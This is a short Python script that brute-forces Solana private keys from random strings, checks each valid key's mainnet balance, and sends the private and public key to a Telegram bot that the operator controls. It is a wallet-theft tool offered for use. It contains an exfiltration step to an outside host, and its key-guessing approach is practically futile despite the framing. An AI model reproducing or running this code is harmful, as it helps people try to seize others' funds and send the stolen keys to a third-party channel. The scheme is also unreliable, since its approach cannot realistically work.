import random
import string
import time
import requests
from solders.keypair import Keypair
from solana.rpc.api import Client

#Replace your bot token (make by @botfather in telegra,)
BOT_TOKEN = 'Bot_Token'

#Send first message to bot . then replace id below with your user name e.g : @MyUsername
my_id = "Telegram_Username : Your Telegram User Id(NumericID) / Username (@username)"

# Generate random private key
def generate_random_string(length=88):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choices(characters, k=length))

# Check private key is valid (have public key or not)
def is_valid_private_key(private_key_str):
    try:
        Keypair.from_base58_string(private_key_str)
        return True
    except:
        pass
        return False

# Get wallet balance
def get_balance(pubkey_str):
    client = Client("https://api.mainnet-beta.solana.com")
    response = client.get_balance(pubkey_str)
    lamports = response.value
    sol = lamports / 1_000_000_000
    return sol

# Send founded wallet to telegram bot
def sendMessage(pri_key,pub_key,balance):
    my_message = f"Founded ({balance} SOL) :\n\nPrivate : {pri_key}\n\nPublic : {pub_key}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={my_id}&text={my_message}"
    requests.get(url).json()


# Main module (Check private keys while an wallet founded)
def main():
    checkingItem = 0
    while True:
        random_str = generate_random_string()
        checkingItem+=1
        print(f"[{checkingItem}] Checking : {random_str}")
        if is_valid_private_key(random_str):
            keypair = Keypair.from_base58_string(random_str)
            pubkey = keypair.pubkey()
            balance = get_balance(pubkey)
            print(f"    FOUNDED : {random_str}")
            print(f"    Wallet : {pubkey}")
            print(f"    Balance : {balance}")
            sendMessage(random_str,pubkey,balance)

        # Cooldown RPC (0.5 second)
        time.sleep(0.5)

# Run main
if __name__ == "__main__":
    main()